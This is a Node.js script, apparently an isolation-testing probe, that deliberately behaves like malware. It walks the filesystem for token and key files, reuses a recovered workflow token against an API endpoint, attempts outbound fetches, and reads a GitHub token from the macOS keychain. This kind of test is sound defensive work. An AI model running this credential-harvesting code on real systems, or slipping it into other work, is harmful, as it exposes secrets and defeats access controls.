// Malicious surface payload (deployment-control negative probe): actively DISCOVER known
// PEP secret/token files across the filesystem and attempt to USE any credential + reach the
// governed targets. Prints one JSON line. Runs inside whatever isolation the surface uses.
import { readFileSync, readdirSync, existsSync } from "node:fs";
import { execFileSync } from "node:child_process";

const targets = JSON.parse(process.env.PROBE_TARGETS ?? "{}");
const findings = { fs_reads: [], enumerated: [], credential_use: [], egress: [] };

// 1) discover secret/token material by walking candidate roots.
const roots = (process.env.PROBE_SEARCH_ROOTS ?? "").split(":").filter(Boolean);
const names = ["manifest.json", "api-tokens.json", "github-token", "record-api-key", "root-token", "root-key.pem"];
function walk(dir, depth) {
  if (depth > 4) return;
  let entries;
  try { entries = readdirSync(dir, { withFileTypes: true }); }
  catch (e) { return; }
  findings.enumerated.push(dir);
  for (const e of entries) {
    const p = `${dir}/${e.name}`;
    if (e.isDirectory()) { if (!e.name.startsWith(".git")) walk(p, depth + 1); }
    else if (names.includes(e.name)) {
      try { findings.fs_reads.push({ path: p, bytes: readFileSync(p, "utf8").length }); } catch (err) { /* denied */ }
    }
  }
}
for (const r of roots) { try { walk(r, 0); } catch { /* denied */ } }

// 2) if a manifest was read, recover a token and hit the Kernel effect path.
for (const f of findings.fs_reads) {
  if (f.path.endsWith("manifest.json")) {
    try {
      const mani = JSON.parse(readFileSync(f.path, "utf8"));
      const token = mani.tokens?.["cadp-workflow"];
      if (token && mani.api_url) {
        const res = await fetch(`${mani.api_url}/allocate_effect_id`, {
          method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
          body: JSON.stringify({ schema: "cadp.allocation-key.v1", work_run_ref: "cadp-v04:effect:00000000-0000-7000-8000-000000000bad", step_ordinal: 1, purpose: "record-write" }),
          signal: AbortSignal.timeout(4000),
        });
        findings.credential_use.push({ via: "manifest workflow token → allocate_effect_id", status: res.status });
      }
    } catch (e) { findings.credential_use.push({ error: String(e).slice(0, 80) }); }
  }
}

// 3) governed target egress (should be refused/http 000 under isolation).
for (const [name, url] of Object.entries(targets)) {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
    findings.egress.push({ target: name, url, status: res.status });
  } catch (e) {
    findings.egress.push({ target: name, url, status: "000", error: String(e).slice(0, 60) });
  }
}

// 4) keychain / gh credential exfiltration attempt.
try {
  const out = execFileSync("security", ["find-generic-password", "-s", "gh:github.com", "-w"], { encoding: "utf8", timeout: 5000 });
  findings.credential_use.push({ via: "keychain gh token", recovered_bytes: out.trim().length });
} catch (e) { findings.credential_use.push({ via: "keychain gh token", denied: String(e).slice(0, 60) }); }

console.log(JSON.stringify(findings));
